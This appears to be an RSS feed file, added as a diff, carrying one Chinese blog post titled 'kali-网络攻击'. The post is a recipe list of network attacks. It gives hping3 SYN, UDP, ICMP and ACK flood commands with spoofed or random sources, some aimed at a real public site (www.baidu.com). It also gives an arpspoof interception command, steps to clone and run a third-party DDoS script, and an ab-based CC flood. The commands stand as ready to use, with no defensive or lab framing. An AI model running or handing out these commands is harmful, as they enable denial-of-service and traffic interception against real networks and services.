@@ -1,0 +1,190 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>hacker 归档 - 时空之歌</title>
+	<atom:link href="/archives/tag/hacker/feed" rel="self" type="application/rss+xml" />
+	<link>/archives/tag/hacker</link>
+	<description>我们都是阴沟里的虫子，但总还是得有人仰望星空。</description>
+	<lastBuildDate>Mon, 16 Jan 2023 15:42:10 +0000</lastBuildDate>
+	<language>zh-CN</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.4.2</generator>
+
+<image>
+	<url>/wp-content/uploads/2023/03/cropped-63e512384757feff33d9afcf-1-150x150.jpg</url>
+	<title>hacker 归档 - 时空之歌</title>
+	<link>/archives/tag/hacker</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>kali-网络攻击</title>
+		<link>/archives/467</link>
+					<comments>/archives/467#respond</comments>
+		
+		<dc:creator><![CDATA[Space520]]></dc:creator>
+		<pubDate>Mon, 16 Jan 2023 15:42:10 +0000</pubDate>
+				<category><![CDATA[Hacker]]></category>
+		<category><![CDATA[IT]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[文章]]></category>
+		<category><![CDATA[hacker]]></category>
+		<guid isPermaLink="false">http://space520.42web.io/?p=467</guid>
+
+					<description><![CDATA[<p>一、sys flood 原文：https://blog.csdn.net/weixin_51685970/ar [&#8230;]</p>
+<p><a href="/archives/467">kali-网络攻击</a>最先出现在<a href="/">时空之歌</a>。</p>
+]]></description>
+										<content:encoded><![CDATA[
+<h2 class="wp-block-heading">一、sys flood </h2>
+
+
+
+<p>原文：<a rel="noreferrer noopener" href="https://blog.csdn.net/weixin_51685970/article/details/123789009" target="_blank">https://blog.csdn.net/weixin_51685970/article/details/123789009</a></p>
+
+
+
+<pre class="wp-block-code"><code>hping3 -q -n -a 攻击ip -S -s 源端口 --keep -p 目的端口 --flood 被攻击IP</code></pre>
+
+
+
+<h3 class="wp-block-heading">示例：</h3>
+
+
+
+<pre class="wp-block-code"><code>hping3 -q -n -a 192.168.0.10 -S -s 585 --keep -p 1058 --flood 192.168.0.100</code></pre>
+
+
+
+<h2 class="wp-block-heading">二、拒绝服务攻击</h2>
+
+
+
+<p>使用 Hping3 可以很方便构建拒绝服务攻击。比如对目标机发起大量 SYN 连接，伪造源地址为 192.168.10.99，并使用1000微秒的间隔发送各个 SYN 包：</p>
+
+
+
+<h3 class="wp-block-heading">示例：</h3>
+
+
+
+<pre class="wp-block-code"><code>hping3 -I eth0 -a 192.168.10.99 -S 192.168.10.33 -p 80 -i u1000</code></pre>
+
+
+
+<h2 class="wp-block-heading">三、DDOS攻击 (分布式拒绝服务攻击)</h2>
+
+
+
+<h3 class="wp-block-heading">1.UDP ddos攻击：</h3>
+
+
+
+<pre class="wp-block-code"><code><br>hping3 -c 10000 -d 120 --udp -w 64 -p 80 --flood --rand-source www.baidu.com</code></pre>
+
+
+
+<h3 class="wp-block-heading">2.ICMP ddos攻击：</h3>
+
+
+
+<pre class="wp-block-code"><code>hping3 -c 10000 -d 120 --icmp -w 64 -p 80 --flood --rand-source www.baidu.com</code></pre>
+
+
+
+<h3 class="wp-block-heading">3.SYN ddos攻击：</h3>
+
+
+
+<pre class="wp-block-code"><code>hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source www.baidu.com</code></pre>
+
+
+
+<h3 class="wp-block-heading">4.ACK ddos攻击：</h3>
+
+
+
+<pre class="wp-block-code"><code>hping3 -c 10000 -d 120 -A -w 64 -p 80 --flood --rand-source www.baidu.com</code></pre>
+
+
+
+<h2 class="wp-block-heading">四、arp攻击</h2>
+
+
+
+<h3 class="wp-block-heading">语法：</h3>
+
+
+
+<pre class="wp-block-code"><code>arpspoof -i 你的网卡名称 -t 攻击目标的IP地址 攻击目标的网关地址</code></pre>
+
+
+
+<pre class="wp-block-code"><code>arpspoof -i eth0 -t 192.168.0.100 192.168.0.1</code></pre>
+
+
+
+<h2 class="wp-block-heading">五、DDOS攻击(2) </h2>
+
+
+
+<h3 class="wp-block-heading">1.下载DDos的数据包</h3>
+
+
+
+<pre class="wp-block-code"><code>git clone https://github.com/Andysun06/ddos</code></pre>
+
+
+
+<h3 class="wp-block-heading">2.进入你所下载的DDos文件夹</h3>
+
+
+
+<pre class="wp-block-code"><code>cd ddos</code></pre>
+
+
+
+<h3 class="wp-block-heading">3.运行 </h3>
+
+
+
+<pre class="wp-block-code"><code>python ddos-p2.py</code></pre>
+
+
+
+<p> Attack Port即攻击端口，一般服务器默认为80（更多内容请百度） </p>
+
+
+
+<p>Attack Speed即攻击速度，数值越大越快，最大不能超过1000 </p>
+
+
+
+<h2 class="wp-block-heading">六、CC攻击</h2>
+
+
+
+<pre class="wp-block-code"><code>ab -n 参数1 -c 参数2 网站地址</code></pre>
+
+
+
+<p>参数一是并发数（请求的用户量）<br>参数二是发送总量（请求的总次数）<br>（有兴趣的可以在百度上另外学习）<br>参数1，参数2和网站地址由自己设置，这里以 1000，1000，</p>
+<p><a href="/archives/467">kali-网络攻击</a>最先出现在<a href="/">时空之歌</a>。</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/archives/467/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
